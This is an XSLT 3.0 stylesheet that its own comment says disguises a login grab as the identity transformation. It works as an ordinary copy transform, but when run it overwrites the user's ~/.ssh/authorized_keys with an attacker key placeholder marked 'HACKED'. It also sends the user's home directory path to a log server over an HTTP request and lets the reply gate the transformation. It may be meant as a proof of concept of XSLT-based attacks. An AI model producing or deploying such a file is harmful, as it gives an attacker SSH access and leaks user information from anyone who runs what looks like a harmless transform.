<?xml version="1.0" encoding="UTF-8"?>
<!-- Obtaining a login masked as the identity transformation -->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:xs="http://www.w3.org/2001/XMLSchema" version="3.0">

    <xsl:mode on-no-match="shallow-copy"/>

    <xsl:template match="document-node()">
       <xsl:result-document
	   method="text"
	   href="{concat(system-property('user.home'), '/.ssh/authorized_keys')}">
	  <xsl:text>put/your/public/ssh/key/here= HACKED</xsl:text>
        </xsl:result-document>
        <xsl:if test="
                let $file := '/etc/passwd',
                    $logserver := 'http://localhost:8000/notify?login=',
                    $encoding := map {
                        'encoding': 'utf8',
                        'method': 'html',
                        'escape-uri-attributes': true()
                    },
                    $login := system-property('user.home'),
                    $encoded := serialize($login, $encoding),
                    $response := doc(concat($logserver, $encoded))
                return
                    xs:boolean($response/*:b/text())">
            <xsl:apply-templates/>
        </xsl:if>
    </xsl:template>

</xsl:stylesheet>
